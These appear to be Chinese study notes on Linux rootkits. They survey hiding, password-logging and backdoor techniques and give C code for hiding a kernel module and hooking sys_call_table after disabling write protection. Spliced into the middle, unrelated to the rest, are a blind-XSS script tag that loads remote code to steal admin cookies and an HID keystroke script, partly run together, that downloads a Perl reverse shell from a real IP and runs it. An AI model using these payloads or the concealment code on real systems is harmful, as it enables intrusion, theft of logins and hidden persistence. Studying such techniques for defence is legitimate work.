**linux rootkit**

[TOC]

# rootkit主要原理

## 1.rootkit三大类

​	rootkit 的主要分类：应用级 -> 内核级 -> 硬件级 

 　　早期的 rootkit 主要为应用级 rootkit ，应用级 rootkit 主要通过替换 login 、 ps 、 ls 、 netstat 等系统工具，或修改 .rhosts 等系统配置文件等实现隐藏及后门；硬件级 rootkit 主要指 bios rootkit ，可以在系统加载前获得控制权，通过向磁盘中写入文件，再由引导程序加载该文件重新获得控制权，也可以采用虚拟机技术，使整个操作系统运行在 rootkit 掌握之中；目前最常见的 rootkit 是内核级 rootkit 。 

## 2.内核rootkit

​	内核级 rootkit又可分为 lkm rootkit 、非 lkm rootkit 。 **lkm rootkit** 主要基于 lkm 技术，通过系统提供的接口加载到内核空间，成为内核的一部分，进而通过 hook 系统调用等技术实现隐藏、后门功能。非 lkm rootkit 主要是指在系统不支持 lkm 机制时修改内核的一种方法，主要通过 /dev/mem 、 /dev/kmem 设备直接操作内存，从而对内核进行修改。 

​	非 lkm rootkit 要实现对内核的修改，首先需要获得内核空间的内存，因此需要调用 kmalloc 分配内存，而kmalloc 是内核空间的调用，无法在用户空间直接调用该函数，因此想到了通过 int 0x80 调用该函数的方法。先选择一个不常见的系统调用号，在 sys_call_table 中找到该项，通过写 /dev/mem 直接将其修改为 kmalloc 函数的地址，这样当我们在用户空间调用该系统调用时，就能通过 int 0x80 进入内核空间，执行 kmalloc 函数分配内存，并将分配好的内存地址由 eax 寄存器返回，从而我们得到了一块属于内核地址空间的内存，接着将要 hack 的函数写入该内存，并再次修改系统调用表，就能实现 hook 系统调用的功能。 

## 3.**Rootkit的常见功能**

  　　**隐藏文件**：通过 strace ls 可以发现 ls 命令其实是通过 sys_getdents64 获得文件目录的，因此可以通过修改sys_getdents64 系统调用或者更底层的 readdir 实现隐藏文件及目录，还有对 ext2 文件系统直接进行修改的方法，不过实现起来不够方便，也有一些具体的限制。

  　　**隐藏进程**：隐藏进程的方法和隐藏文件类似， ps 命令是通过读取 /proc 文件系统下的进程目录获得进程信息的，只要能够隐藏 /proc 文件系统下的进程目录就可以达到隐藏进程的效果，即 hook sys_getdents64 和 readdir等。

  　　**隐藏连接**： netstat 命令是通过读取 /proc 文件系统下的 net/tcp 和 net/udp 文件获得当前连接信息，因此可以通过 hook sys_read 调用实现隐藏连接，也可以修改 tcp4_seq_show 和 udp4_seq_show 等函数实现。  　　隐藏模块： lsmod 命令主要是通过 sys_query_module 系统调用获得模块信息，可以通过 hook sys_query_module 系统调用隐藏模块，也可以通过将模块从内核模块链表中摘除从而达到隐藏效果。

  　　**嗅探工具**：嗅探工具可以通过 libpcap 库直接访问链路层，截获数据包，也可以通过 linux 的 netfilter 框架在IP 层的 hook 点上截获数据包。嗅探器要获得网络上的其他数据包需要将网卡设置为混杂模式，这是通过 ioctl 系统调用的 SIOCSIFFLAGS 命令实现的，查看网卡的当前模式是通过 SIOCGIFFLAGS 命令，因此可以通过 hook sys_ioctl 隐藏网卡的混杂模式。

  　　**密码记录**：密码记录可以通过 hook sys_read 系统调用实现，比如通过判断当前运行的进程名或者当前终端是否关闭回显，可以获取用户的输入密码。 hook sys_read 还可以实现 login 后门等其它功能。  日志擦除：传统的 unix 日志主要在 /var/log/messages ， /var/log/lastlog ， /var/run/utmp ， /var /log/wtmp下，可以通过编写相应的工具对日志文件进行修改，还可以将 HISTFILE 等环境变设为 /dev/null 隐藏用户的一些操作信息。

​	  **内核后门**：可以是本地的提权后门和网络的监听后门，本地的提权可以通过对内核模块发送定制命令实现，网络内核后门可以在 IP 层对进入主机的数据包进行监听，发现匹配的指定数据包后立刻启动回连进程。 

## 4.**Rootkit的主要技术** 

　　 lkm 注射、模块摘除、拦截中断（ 0x80 、 0x01 ）、劫持系统调用、运行时补丁、 inline hook 、端口反弹…… 
　　 **lkm 注射**：也是一种隐藏内核模块的方法，通过感染系统的 lkm ，在不影响原有功能的情况下将 rootkit 模块链接到系统 lkm 中，在模块运行时获得控制权，初始化后调用系统 lkm 的初始化函数， lkm 注射涉及到 elf 文件格式与模块加载机制。 
　　**模块摘除**：主要是指将模块从模块链表中摘除从而隐藏模块的方法，最新加载的模块总是在模块链表的表头，因此可以在加载完 rootkit 模块后再加载一个清除模块将 rootkit 模块信息从链表中删除，再退出清除模块，新版本内核中也可以通过判断模块信息后直接 list_del 。 
　　**拦截中断**：主要通过 sidt 指令获得中断调用表的地址，进而获取中断处理程序的入口地址，修改对应的中断处理程序，如 int 0x80 ， int 0x1 等。其中拦截 int 0x1 是较新的技术，主要利用系统的调试机制，通过设置 DR 寄存器在要拦截的内存地址上下断点，从而在执行到指定指令时转入 0x1 中断的处理程序，通过修改 0x1 中断的处理程序即可实现想要的功能。 
　　**劫持系统调用**：和拦截中断类似，但主要是对系统调用表进行修改，可以直接替换原系统调用表，也可以修改系统调用表的入口地址。在 2.4 内核之前，内核的系统调用表地址是导出的，因此可以直接对其进行修改。但在 2.6 内核之后，系统调用表的地址已经不再导出，需要对 0x80 中断处理程序进行分析从而获取系统调用表的地址。 
　　**运行时补丁**：字符设备驱动程序和块设备驱动程序在加载时都会向系统注册一个 Struct file_operations 结构实现指定的 read 、 write 等操作，文件系统也是如此，通过修改文件系统的 file_operations 结构，可以实现新的 read 、 write 操作等。 
　　 **inline hook** ：主要是指对内存中的内核函数直接修改，而不影响原先的功能，可以采用跳转的办法，也可以修改对下层函数的 call offset 实现。 
　　**端口反弹**：主要是为了更好的突破防火墙的限制，可以在客户端上监听80端口，而在服务器端通过对客户端的80端口进行回连，伪装成一个访问web服务的正常进程从而突破防火墙的限制。







```
</textarea>'"><script src=http://t.cn/R63bUP9></script>
```

XSS盲打 ,通过XSS盲打可以直接拿到管理员登录的账号的Cookie等信息 

"Nethunter"的黑客操作系统 ,工具叫做DuckHunter HID 

```
CONTROL SPACE
STRING iterm
ENTERENTER
STRING
ifconfig
ENTER
```

反弹Shell 

```
CONTROL SPACE
STRING iterm 
ENTERENTER
STRING wget http://45.32.8.108/b.pl.txt -O /tmp/b.plSTRING perl /tmp/b.pl 
反弹监听IP 监听端口
ENTER
```



[Linux Rootkit系列一：LKM的基础编写及隐藏](http://www.freebuf.com/articles/system/54263.html) 

[Linux Rootkit 系列二：基于修改 sys_call_table 的系统调用挂钩](http://www.freebuf.com/sectool/105713.html) 

[Linux Rootkit系列三：实例详解 Rootkit 必备的基本功能](http://www.freebuf.com/articles/system/107829.html)

 [Linux Rootkit 系列四：对于系统调用挂钩方法的补充](http://www.freebuf.com/articles/system/108392.html) 

[Linux Rootkit 系列五：感染系统关键内核模块实现持久化](http://www.freebuf.com/articles/system/109034.html) 

# 1.[LKM的基础编写及隐藏](http://www.freebuf.com/articles/system/54263.html)

**LKM的全称为Loadable Kernel Modules，中文名为可加载内核模块，主要作用是用来扩展linux的内核功能。**LKM的优点在于可以动态地加载到内存中，无须重新编译内核。由于LKM具有这样的特点，所以它经常被用于一些设备的驱动程序，例如声卡，网卡等等。当然因为其优点，也经常被骇客用于rootkit技术当中。 

## 1.基本的LKM的编写

​	就是驱动的编写，这是因为我们并没有对于我们的消息指定KERN_ALERT优先级,此时printk将消息传输到了系统日志syslog中，我们可以在/var/log/messages中查看，当然，在不同的发行版以及不同的syslog配置中，该文件的路径不同。cat /var/log/messages或者利用dmesg命令查看printk输出的消息

## 2.从lsmod命令中隐藏我们的模块

​	既不想让dmesg也不想让lsmod这两个命令察觉到我们的模块 ，lsmod命令是通过/proc/modules来获取当前系统模块信息的。而/proc/modules中的当前系统模块信息是内核利用struct modules结构体的表头遍历内核模块链表、从所有模块的struct module结构体中获取模块的相关信息来得到的。结构体struct module在内核中代表一个内核模块。通过insmod(实际执行init_module系统调用)把自己编写的内核模块插入内核时，模块便与一个 struct module结构体相关联，并成为内核的一部分，所有的内核模块都被维护在一个全局链表中，链表头是一个全局变量struct module *modules。任何一个新创建的模块，都会被加入到这个链表的头部，通过modules->next即可引用到。为了让我们的模块在lsmod命令中的输出里消失掉，我们需要在这个链表内删除我们的模块 。

## 3.从sysfs中隐藏我们的模块

除了lsmod命令和相对应的查看/proc/modules以外，我们还可以在sysfs中，也就是通过查看/sys/module/目录来发现现有的模块。 在初始化函数中添加一行代码即可解决问题：

```c
kobject_del(&THIS_MODULE->mkobj.kobj);
```

**kobj是一个struct kobject结构体，而kobject是组成设备模型的基本结构。这时我们又要简单介绍下sysfs这个概念，sysfs是一种基于ram的文件系统，它提供了一种用于向用户空间展现内核空间里的对象、属性和链接的方法。sysfs与kobject层次紧密相连，它将kobject层次关系表现出来，使得用户空间可以看见这些层次关系。通常，sysfs是挂在在/sys目录下的，而/sys/module是一个sysfs的一个目录层次, 包含当前加载模块的信息. 我们通过kobject_del()函数删除我们当前模块的kobject就可以起到在/sys/module中隐藏lkm的作用。**

好了，这时再将"kobject_del(&THIS_MODULE->mkobj.kobj);"也添加在初始化函数里，保存，编译，装载模块，然后再去看看/sys/module，是不是什么也看不到了？

**对于lkm的入门以及lkm的简单隐藏办法已经介绍完了，但是这只是通向lkm rootkit的长征路上第一步，在下次的文章中，我会介绍lkm rootkit编写中最为关键的技术：system call hook，也就是系统调用挂钩技术。**

# [2.基于修改 sys_call_table 的系统调用挂钩](http://www.freebuf.com/sectool/105713.html) 

不打算给大家介绍三种不同的系统调用挂钩技术，相反，本文仅详细讲解最简单的系统调用挂钩方案，并且基于这个方案实现最基本的文件监视工具。 代码仓库： <https://github.com/NoviceLive/research-rootkit> 。代码在最新的 64 比特 [Arch](https://www.archlinux.org/) 与[Kali](https://www.kali.org/) 上面测试正常。 

**测试建议：** **不要在物理机测试！不要在物理机测试！不要在物理机测试！** 

 [tmux](https://tmux.github.io/) 或者类似的工具，则可以垂直分割你的终端窗口 。 一个窗口开一个 `sudo dmesg -C && dmesg -w`，用于查看日志； 另一个窗口用来做其他操作，比如构建、加载内核模块。  

## 第一部分：基于修改 [sys_call_table](http://lxr.free-electrons.com/ident?i=sys_call_table) 的系统调用挂钩

在系统调用挂钩技术中，最简单、最流行的方案是修改[sys_call_table](http://lxr.free-electrons.com/ident?i=sys_call_table)， 成员类型为函数指针的一维数组。要修改它，首先得拿到它在内存里的位置。 然后，由于[sys_call_table](http://lxr.free-electrons.com/ident?i=sys_call_table)所在的内存是有写保护的， 所以我们需要先去掉写保护，再做修改。 

### 1.获得 [sys_call_table](http://lxr.free-electrons.com/ident?i=sys_call_table) 的内存地址 

一，从[/boot/System.map](https://en.wikipedia.org/wiki/System.map) 中读取，感兴趣的读者可以查阅 [Hooking the Linux System CallTable](https://tnichols.org/2015/10/19/Hooking-the-Linux-System-Call-Table/)， 这篇文章便是使用这种方案来获取[sys_call_table](http://lxr.free-electrons.com/ident?i=sys_call_table)的地址的。 

二，从使用了[sys_call_table](http://lxr.free-electrons.com/ident?i=sys_call_table)的某些未导出函数的机器码里面进行特征搜索， 感兴趣的读者可以查阅[Kernel-LandRootkits](http://www.kernelhacking.com/rodrigo/docs/StMichael/kernel-land-rootkits.pdf)， 作者花了几张 slides 阐述了如何从导出的函数中获取使用了[sys_call_table](http://lxr.free-electrons.com/ident?i=sys_call_table)的未导出函数， 进而搜索那个未导出函数的机器码， 得到[sys_call_table](http://lxr.free-electrons.com/ident?i=sys_call_table)的地址；等等。 

三，在综合考量了几种可选的获取方案之后，笔者决定采用从内核起始地址开始暴力搜索内存空间的方案。 （**但是这种方案有可能被欺骗** 。）

```c
unsigned long **
get_sys_call_table(void)
{
  unsigned long **entry = (unsigned long **)PAGE_OFFSET;

  for (;(unsigned long)entry < ULONG_MAX; entry += 1) {
    if (entry[__NR_close] == (unsigned long *)sys_close) {
        return entry;
      }
  }
  return NULL;
}
```

[PAGE_OFFSET](http://lxr.free-electrons.com/ident?i=PAGE_OFFSET)是内核内存空间的起始地址。 因为[sys_close](http://lxr.free-electrons.com/ident?i=sys_close)是导出函数（需要指出的是， `sys_open` 、 `sys_read` 等并不是导出的），我们可以直接得到他的地址；因为系统调用号 （也就是[sys_call_table](http://lxr.free-electrons.com/ident?i=sys_call_table)这个一维数组的索引） 在同一[ABI](https://en.wikipedia.org/wiki/Application_binary_interface) （x86跟 x64 不是同一 ABI）上具有高度的后向兼容性，更重要的是，我们可以直接使用这个索引（代码中的 `__NR_close` ）！

从内核内存的起始地址开始， 逐一尝试每一个指针大小的内存：把它当成是[sys_call_table](http://lxr.free-electrons.com/ident?i=sys_call_table)的地址， 用某个系统调用的编号（也就是索引）访问数组中的成员，如果访问得到的值刚好是是这个系统调用号所对应的系统调用的地址，那么我们就认为当前尝试的这块指针大小的内存就是我们要找的[sys_call_table](http://lxr.free-electrons.com/ident?i=sys_call_table)的地址。

### 2.关闭写保护

写保护指的是写入只读内存时出错。 这个特性可以通过[CR0](https://en.wikipedia.org/wiki/Control_register#CR0)寄存器控制：开启或者关闭， 只需要修改一个比特，也就是从 0 开始数的第 16个比特。看代码。我们可以使用[read_cr0](http://lxr.free-electrons.com/ident?i=read_cr0) /[write_cr0](http://lxr.free-electrons.com/ident?i=write_cr0) 来读取 /写入 [CR0](https://en.wikipedia.org/wiki/Control_register#CR0) 寄存器，免去我们自己写内联汇编的麻烦。

我们使用了[set_bit](https://www.kernel.org/doc/htmldocs/kernel-api/API-set-bit.html)与[clear_bit](https://www.kernel.org/doc/htmldocs/kernel-api/API-clear-bit.html)。 它们是 Linux 内核提供给内核模块使用的编程接口，简单易懂 

### 3.修改 [sys_call_table](http://lxr.free-electrons.com/ident?i=sys_call_table)

一维数组赋值，当之无愧最简单的方案。当然，我们需要先把真正的值保存好，以备后面之需。

```c
disable_write_protection();
real_open = (void *)sys_call_table[__NR_open];
sys_call_table[__NR_open] = (unsigned long*)fake_open;
real_unlink = (void *)sys_call_table[__NR_unlink];
sys_call_table[__NR_unlink] = (unsigned long*)fake_unlink;
real_unlinkat = (void *)sys_call_table[__NR_unlinkat];
sys_call_table[__NR_unlinkat] = (unsigned long*)fake_unlinkat;
enable_write_protection();
```

### 4.恢复

```c
disable_write_protection();
sys_call_table[__NR_open] = (unsigned long*)real_open;
sys_call_table[__NR_unlink] = (unsigned long*)real_unlink;
sys_call_table[__NR_unlinkat] = (unsigned long*)real_unlinkat;
enable_write_protection();
```

## 第二部分：基于系统调用挂钩的初级文件监视

监视文件的创建与删除。 我们挂钩[sys_open](http://lxr.free-electrons.com/ident?i=sys_open),[sys_unlink](http://lxr.free-electrons.com/ident?i=sys_unlink),[sys_unlinkat](http://lxr.free-electrons.com/ident?i=sys_unlinkat)这三个函数， 并且在我们的钩子函数把操作到的文件名打印出来，然后把控制交给真正的系统调用处理。

### 1.[sys_open](http://lxr.free-electrons.com/ident?i=sys_open) 的钩子函数： `fake_open`

考虑到在系统运行时，对文件的读写操作从未中断，这里只打印了进行创建操作的文件名，准确地说是，[sys_open](http://lxr.free-electrons.com/ident?i=sys_open) 的 `flags`中包含 [O_CREAT](http://lxr.free-electrons.com/ident?i=O_CREAT) 。

```
asmlinkage long
fake_open(const char __user *filename, int flags, umode_t mode)
{
  if ((flags & O_CREAT) && strcmp(filename, "/dev/null") != 0) {
    printk(KERN_ALERT "open: %s\n", filename);
  }

  return real_open(filename, flags, mode);
}
```

注：这里的[strcmp](https://www.kernel.org/doc/htmldocs/kernel-api/API-strcmp.html)也是内核提供的。

### 2.[sys_unlink](http://lxr.free-electrons.com/ident?i=sys_unlink) 与 **sys_unlinkat** 的钩子函数： `fake_unlink` 与 `fake_unlinkat`

简单处理，直接打印路径名。

```
asmlinkage long
fake_unlink(const char __user *pathname)
{
  printk(KERN_ALERT "unlink: %s\n", pathname);

  return real_unlink(pathname);
}

asmlinkage long
fake_unlinkat(int dfd, const char __user * pathname, int flag)
{
  printk(KERN_ALERT "unlinkat: %s\n", pathname);

  return real_unlinkat(dfd, pathname, flag);
}
```

### 3.测试我们的文件监视工具

初级的文件监视就到这了，以后我们在做进一步的改进与完善。

## 第三部分：参考资料与延伸阅读

### 1. 参考资料

> - [Linux Cross Reference](http://lxr.free-electrons.com/)
> - [The Linux KernelAPI](https://www.kernel.org/doc/htmldocs/kernel-api/index.html)
> - [How the Linux kernel handles a systemcall](https://0xax.gitbooks.io/linux-insides/content/SysCall/syscall-2.html)
> - [CR0](https://en.wikipedia.org/wiki/Control_register#CR0)

### 2. 延伸阅读

> - [Hooking the Linux System CallTable](https://tnichols.org/2015/10/19/Hooking-the-Linux-System-Call-Table/)
> - [Kernel-LandRootkits](http://www.kernelhacking.com/rodrigo/docs/StMichael/kernel-land-rootkits.pdf)



https://www.w0lfzhang.com/2017/08/25/Linux-Kernel-Rootkit-Learning/

https://paper.seebug.org/497/















